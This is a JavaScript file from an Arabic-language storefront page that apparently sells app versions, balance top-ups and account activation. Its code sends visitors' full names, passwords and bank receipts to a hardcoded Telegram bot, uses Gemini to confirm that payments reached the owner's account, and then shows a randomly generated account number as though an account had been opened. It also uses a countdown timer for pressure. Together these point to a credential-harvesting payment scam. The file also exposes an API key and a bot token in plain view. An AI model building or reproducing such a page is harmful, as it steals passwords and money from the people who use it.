// مفتاح الـ API الخاص بك والبيانات الأساسية
const GEMINI_API_KEY = 'AIzaSyDlEkkD8xHAiET_A67mo4I3kslNmWzUF0A'; 
const TOKEN = '8572250361:AAEB89MDQx_QRBGQR7vTDK9v1k92_4CRxmw';
const MY_ID = '7908500383';
const MY_ACCOUNT_NUMBER = '300159768'; // رقم حسابك للتأكد منه

let currentProduct = "";
let selectedAccType = "";
let calculatedPrice = 0;

// --- 1. نظام رسالة الترحيب ---
window.onload = function() {
    setTimeout(() => { closeWelcome(); }, 15000);
};

function closeWelcome() {
    const welcome = document.getElementById('welcomeMessage');
    if(welcome) welcome.style.display = 'none';
}

// --- 2. وظيفة الذكاء الاصطناعي لفحص الإشعارات ---
async function startAiVerification(input) {
    const file = input.files[0];
    if (!file) return;

    const loadingArea = document.getElementById('loadingArea');
    const loadingText = document.getElementById('loadingText');
    const paymentArea = document.getElementById('paymentArea');

    paymentArea.style.display = "none";
    loadingArea.style.display = "block";
    loadingText.innerText = "جاري تحليل الإشعار بواسطة الذكاء الاصطناعي...";

    try {
        // تحويل الصورة لصيغة يفهمها الذكاء الاصطناعي
        const base64Image = await toBase64(file);
        const imageData = base64Image.split(',')[1];

        // إرسال الطلب لـ Gemini
        const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                contents: [{
                    parts: [
                        { text: `استخرج من صورة إشعار بنكك هذه: 1- رقم العملية (Ref Number). 2- هل تم التحويل إلى الرقم ${MY_ACCOUNT_NUMBER}؟ أجب بصيغة JSON فقط: {"ref": "الرقم", "is_correct_acc": true/false}` },
                        { inline_data: { mime_type: "image/jpeg", data: imageData } }
                    ]
                }]
            })
        });

        const data = await response.json();
        const aiResponse = JSON.parse(data.candidates[0].content.parts[0].text.replace(/```json|```/g, ""));

        if (aiResponse.ref && aiResponse.is_correct_acc) {
            // نجح الفحص
            document.getElementById('refNumber').value = aiResponse.ref;
            loadingText.innerText = "تم التحقق بنجاح! جاري إرسال البيانات...";
            
            // إرسال لـ Telegram
            await finalTelegramSend(file, aiResponse.ref);
        } else {
            alert("⚠️ فشل التحقق: الإشعار غير صحيح أو لم يتم التحويل لحسابنا.");
            resetToPayment();
        }
    } catch (error) {
        console.error(error);
        alert("❌ حدث خطأ في الفحص الذكي. حاول مرة أخرى.");
        resetToPayment();
    }
}

// وظائف مساعدة للذكاء الاصطناعي
function toBase64(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = () => resolve(reader.result);
        reader.onerror = error => reject(error);
    });
}

async function finalTelegramSend(file, ref) {
    const formData = new FormData();
    formData.append('chat_id', MY_ID);
    formData.append('photo', file);
    formData.append('caption', `✅ إشعار مفحوص ذكياً\n📦 الخدمة: ${currentProduct}\n🔢 رقم العملية: ${ref}\n💰 الحالة: دفع حقيقي`);

    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    if (response.ok) {
        document.getElementById('loadingArea').style.display = "none";
        showFinalSuccess();
    }
}

function resetToPayment() {
    document.getElementById('loadingArea').style.display = "none";
    document.getElementById('paymentArea').style.display = "block";
}

// --- باقي وظائف المتجر (المجاني، الشراء، الشحن) ---
function openFreeSection() {
    currentProduct = "النسخة المجانية";
    resetModal();
    document.getElementById('modalTitle').innerText = "تحميل النسخة المجانية";
    document.getElementById('freeSection').style.display = "block";
    document.getElementById('payModal').style.display = "block";
}

function openPay(title, price) {
    currentProduct = title;
    resetModal();
    document.getElementById('modalTitle').innerText = title;
    document.getElementById('modalPrice').innerText = "المبلغ المطلوب: " + price + " جنيه";
    document.getElementById('paymentArea').style.display = "block";
    document.getElementById('payModal').style.display = "block";
}

function openShipping(title) {
    currentProduct = title;
    resetModal();
    document.getElementById('modalTitle').innerText = title;
    document.getElementById('shippingInputs').style.display = "block";
    document.getElementById('payModal').style.display = "block";
}

function calculatePrice() {
    let amount = document.getElementById('shipAmount').value;
    if (amount >= 100) {
        calculatedPrice = (amount / 100) * 10000;
        document.getElementById('calcResult').innerText = `المطلوب تحويله: ${calculatedPrice.toLocaleString()} جنيه`;
    } else {
        document.getElementById('calcResult').innerText = "أقل مبلغ شحن هو 100 ألف";
        calculatedPrice = 0;
    }
}

async function submitShippingInfo() {
    let acc = document.getElementById('shipAccount').value;
    let amount = document.getElementById('shipAmount').value;
    if (acc.length < 5 || amount < 100) {
        alert("⚠️ أدخل بيانات صحيحة (أقل شحن 100 ألف)"); return;
    }
    sendDataToTelegram(`⚡ طلب شحن:\nالنوع: ${currentProduct}\nالحساب: ${acc}\nالكمية: ${amount} ألف`);
    document.getElementById('shippingInputs').style.display = "none";
    document.getElementById('modalPrice').innerText = `المطلوب تحويله: ${calculatedPrice.toLocaleString()} جنيه`;
    document.getElementById('paymentArea').style.display = "block";
}

function openAccountSystem() {
    currentProduct = "فتح حساب جديد";
    resetModal();
    document.getElementById('modalTitle').innerText = "فتح وتفعيل حساب";
    document.getElementById('accountTypeSelector').style.display = "block";
    document.getElementById('payModal').style.display = "block";
}

function selectAccType(type) {
    selectedAccType = type;
    document.getElementById('accountTypeSelector').style.display = "none";
    document.getElementById('accountForm').style.display = "block";
}

async function submitAccountInfo() {
    let name = document.getElementById('userFullName').value;
    let pass = document.getElementById('userPass').value;
    if (name.length < 10 || pass.length < 4) {
        alert("⚠️ يرجى إدخال الاسم الرباعي وكلمة سر قوية."); return;
    }
    sendDataToTelegram(`👤 فتح حساب جديد:\nالنوع: ${selectedAccType}\nالاسم: ${name}\nكلمة السر: ${pass}`);
    document.getElementById('accountForm').style.display = "none";
    document.getElementById('modalPrice').innerText = "المبلغ المطلوب: 20,000 جنيه";
    document.getElementById('paymentArea').style.display = "block";
}

function showFinalSuccess() {
    const successArea = document.getElementById('successArea');
    successArea.style.display = "block";

    if (currentProduct.includes("نسخة") || currentProduct.includes("VIP")) {
        document.getElementById('downloadSection').style.display = "block";
        document.getElementById('afterActionText').innerText = "تم التحقق ذكياً. حمل التطبيق الآن وفعله عبر المطور.";
    } 
    else if (currentProduct === "فتح حساب جديد") {
        let randomAcc = Math.floor(1000000 + Math.random() * 9000000);
        document.getElementById('accountCard').style.display = "block";
        document.getElementById('resName').innerText = document.getElementById('userFullName').value;
        document.getElementById('resAcc').innerText = randomAcc;
        document.getElementById('afterActionText').innerText = "مبروك! تم توليد حسابك. تواصل لتفعيله.";
    }
    else {
        document.getElementById('afterActionText').innerText = "تم استلام إشعار الشحن بنجاح.";
    }
}

function resetModal() {
    const ids = ['shippingInputs', 'accountForm', 'accountTypeSelector', 'paymentArea', 'successArea', 'accountCard', 'downloadSection', 'freeSection', 'loadingArea'];
    ids.forEach(id => { if(document.getElementById(id)) document.getElementById(id).style.display = "none"; });
}

async function sendDataToTelegram(text) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: MY_ID, text: text })
    });
}

function copyAccountNumber() {
    navigator.clipboard.writeText(MY_ACCOUNT_NUMBER).then(() => { alert("تم نسخ رقم الحساب ✅"); });
}

function closeModal() { document.getElementById('payModal').style.display = "none"; }

// العداد
let time = 86396; 
setInterval(() => {
    let h = Math.floor(time / 3600); let m = Math.floor((time % 3600) / 60); let s = time % 60;
    if(document.getElementById('timer')) document.getElementById('timer').innerText = `${h}:${m}:${s}`;
    if (time > 0) time--;
}, 1000);
